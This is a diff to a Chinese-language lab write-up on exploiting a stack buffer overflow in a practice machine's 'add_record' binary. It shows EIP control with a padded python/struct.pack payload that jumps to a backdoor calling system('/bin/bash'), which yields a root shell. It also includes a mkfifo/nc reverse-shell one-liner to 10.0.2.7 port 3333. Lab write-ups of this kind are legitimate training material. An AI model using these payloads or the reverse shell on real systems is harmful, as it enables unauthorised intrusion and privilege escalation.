@@ -505,6 +505,26 @@ info func
 
 但因为系统中存储方式为小端序，（ 简单来讲就是内存实际存储和我们看到的是反着来的 ）
 
+我们可以通过以下实验来进行验证,我们构造一个由62个 `A` 拼接上 `BCDE`这四个字符
+
+<font color='red' face=Monaco size=3>62个 `A`  来占位,那么 `BCDE` 则将填入进 `EIP` 内</font> 
+
+![alt](./mechine5.assets/2022-08-13_00-39.png)
+
+我们发现 `BCDE` 被成功填入到 `EIP` 内，可以证明我们之前的设想.
+
+> 我们还发现它实际存储方式和我们看到的相反 `0x45444342` 即为 EDCB 的 ASCII 码对应的16 进制
+
+![alt](./mechine5.assets/2022-08-13_00-40.png)
+
+<font color='red' face=Monaco size=3>所以我们要填充的地址也得反着进行填充。</font> 
+
+所以我们可以使用以下方式来构造 `payload` 
+
+<div style='border-radius:15px;display:block;background-color:#a8dadc;border:2px solid #aaa;margin:15px;padding:10px;'>
+由于 python 版本和 python 库版本的问题,我们使用struct.pack 返回出来的为 bytes 类型,并不能与直接与字符串相加,需要先转换成字符串类型再进行拼接
+</div>
+
 ```python
 import struct
 
@@ -516,23 +536,48 @@ condition = '1\n'
 exp = username + year + salary + condition + 'A' * 62 + str(backdoor_address)
 print(exp)
 ```
+我们可以直接在本地环境将上面这个代码运行之后，对输出结果复制粘贴进目标靶机里
+但是我们发现，最后 `backdoor` 函数地址转换之后为不可见字符
+
+并且目标靶机上有 python 环境，所以我们可以将上面的代码转变成以下代码，方便复制粘贴进目标靶机内执行
 
 ```bash
 python -c "import struct;print('zh\n1\n100\n1\n' + 'A'*62 + str(struct.pack('I',0x08048676)))"
 ```
-
+但目标靶机的python版本比较老，所以我们还可以使用以下方式进行字符串拼接
 
 ```python
 python -c "import struct;print('zh\n1\n100\n1\n' + 'A'*62 + struct.pack('I',0x08048676))"
 ```
 ![alt](./mechine5.assets/2022-08-13_00-34.png)
 ![alt](./mechine5.assets/2022-08-13_00-35.png)
-![alt](./mechine5.assets/2022-08-13_00-39.png)
-![alt](./mechine5.assets/2022-08-13_00-40.png)
+
+当我们将这段payload 传输给程序时，程序创建了另外两个进程 `/bin/dash`
+`/bin/bash`
+
 ![alt](./mechine5.assets/2022-08-13_00-42.png)
+
+既然我们知道当我们注入我们 payload 给程序之后程序一定会执行到 `backdoor` 函数，并且一定会在 `vuln` 函数之前，那我们就可以在 `vuln` 函数处下一个断点，逐步跟进，直到执行到 `backdoor` 函数，看看到底发生了什么
+
 ![alt](./mechine5.assets/2022-08-13_00-46.png)
+
+我们可以看见程序 `push eax` 后面就是执行 `system()` 这个库函数,在stack里我们可以看见 `eax` 的值为 `/bin/bash` 而 eax 默认会存储函数调用的参数
+
+所以函数执行了 `system("/bin/bash");` 如果你不懂 `system();` 函数是干什么的，你可以 `man system` 来了解这个函数
+
+
 ![alt](./mechine5.assets/2022-08-13_00-52.png)
 
-![alt](./mechine5.assets/2022-08-13_00-57.png)
+```bash
+cat payload - | add_record
+```
+发现成功获得一个 root 权限的 shell
 
+我们还可以运行之前用于升级我们 shell 的命令 来进一步巩固我们获得的 root 权限的shell
+
+```bash
+rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.2.7 3333 >/tmp/f
+```
 ![alt](./mechine5.assets/2022-08-13_01-00.png)
+
+<font color='green' face=Monaco size=4>至此我们这台靶机就已经成功被渗透,并也取得 root 最高权限.</font>
